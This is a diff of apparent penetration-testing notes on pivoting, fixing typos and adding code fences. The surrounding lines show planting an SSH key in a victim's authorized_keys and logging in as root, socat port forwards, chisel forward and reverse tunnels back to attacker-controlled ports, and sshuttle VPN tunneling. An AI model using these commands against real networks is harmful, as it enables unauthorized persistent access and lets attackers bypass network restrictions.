@@ -41,7 +41,7 @@ cat id_ed25519.pub >> authorized_keys
 ssh -l root VICTIM_IP
 ```
 
-## Prot forwarding
+## Port forwarding
 
 ```bash
 # Listen on 443 and forward all incomming connections to local port 1389
@@ -58,7 +58,7 @@ socat -v TCP-LISTEN:443,reuseaddr,fork TCP:127.0.0.1:1389
 some service is listening at victim and connection is incomming from atacker 
 
 
-### static  forwardin
+### static  forwarding
 
 ```
  <local-interface>:<local-port>:<remote-host>:<remote-port>
@@ -70,11 +70,15 @@ which does  port forwarding, sharing server's `<remote-host>:<remote-port>` on c
 
 Set up new server (this time non socks) on attacker
 
+```bash
 ./chisel server --port 9902
+```
 
 Activate client on victims host
 
+```bash
 ./chisel client 10.10.14.xxx:9902 192.168.1.15:8888:127.0.0.1:443 
+```
 
 So now listener is on 192.168.1.15:8888 which forwards requests to attacker's localhost port 443. Useful to make attacker's external server available from victim within restricted network.
 
@@ -86,8 +90,10 @@ some service is listening at attacker AND connection is incomming from the victi
 
 #### static reverse
 
-./chisel server -p 9903 --reverse on local 
+```bash
+./chisel server -p 9903 --reverse # on local 
 ./chisel client 10.10.xx.xx:9903 R:127.0.0.1:1280:172.16.xx.xx:80 &
+```
 
 This will open a listener on port 1280 on attackers localhost, and all connections to the target website on 172.16.xx.xx are going to be forwarded via pivot server at 10.10.xx.xx:9903
 
@@ -191,7 +197,7 @@ It can be tricky to use burp with socks but here is a good workaround
 
 ## Transparent VPN over ssh
 
-* setup port forward to ssh server: `socat TCP-LISTEN:2222, fork TCP:10.11.222.3:22`
+* setup port forward to ssh server: `socat TCP-LISTEN:2222,fork TCP:10.11.222.3:22`
 * use sshuttle (requires root privleges): sets up VPN and tunnels mentioned subnets
 
 ```bash
